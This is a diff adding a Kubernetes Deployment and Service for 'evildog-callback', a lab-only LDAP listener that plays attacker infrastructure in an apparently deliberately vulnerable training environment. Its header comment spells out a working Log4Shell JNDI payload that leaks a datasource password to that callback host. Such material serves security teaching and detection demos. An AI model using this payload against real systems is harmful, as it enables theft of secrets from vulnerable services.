@@ -1,0 +1,86 @@
+# =============================================================================
+# DogBank LAB ONLY — EvilDog Callback (Log4Shell exfiltration listener)
+# -----------------------------------------------------------------------------
+# "Attacker infrastructure" for the EBC masterclass. The intentionally
+# vulnerable auth-service (log4j 2.14.1) resolves a JNDI payload such as
+#   ${jndi:ldap://evildog-callback.dogbank.svc.cluster.local:1389/cn=${env:SPRING_DATASOURCE_PASSWORD}}
+# and opens a REAL LDAP connection to this Service, leaking the secret in the DN.
+# evildog-exploit.sh reads the proof via:  kubectl -n dogbank logs deploy/evildog-callback
+# =============================================================================
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: evildog-callback
+  namespace: dogbank
+  labels:
+    app: evildog-callback
+    tags.datadoghq.com/env: dogbank
+    tags.datadoghq.com/service: evildog-callback
+    tags.datadoghq.com/version: "1.0.0"
+    tags.datadoghq.com/team: security
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: evildog-callback
+  template:
+    metadata:
+      labels:
+        app: evildog-callback
+        tags.datadoghq.com/env: dogbank
+        tags.datadoghq.com/service: evildog-callback
+        tags.datadoghq.com/version: "1.0.0"
+      annotations:
+        ad.datadoghq.com/evildog-callback.logs: '[{"source":"python","service":"evildog-callback"}]'
+    spec:
+      containers:
+        - name: evildog-callback
+          image: schawirin/dogbank-evildog-callback:latest
+          imagePullPolicy: Always
+          env:
+            - name: LDAP_PORT
+              value: "1389"
+            - name: HTTP_PORT
+              value: "8000"
+          ports:
+            - containerPort: 1389
+              name: ldap
+            - containerPort: 8000
+              name: http
+          resources:
+            requests:
+              memory: "64Mi"
+              cpu: "50m"
+            limits:
+              memory: "128Mi"
+              cpu: "200m"
+          readinessProbe:
+            tcpSocket:
+              port: 1389
+            initialDelaySeconds: 5
+            periodSeconds: 10
+          livenessProbe:
+            tcpSocket:
+              port: 1389
+            initialDelaySeconds: 10
+            periodSeconds: 15
+
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: evildog-callback
+  namespace: dogbank
+  labels:
+    app: evildog-callback
+spec:
+  type: ClusterIP
+  ports:
+    - port: 1389
+      targetPort: 1389
+      name: ldap
+    - port: 8000
+      targetPort: 8000
+      name: http
+  selector:
+    app: evildog-callback
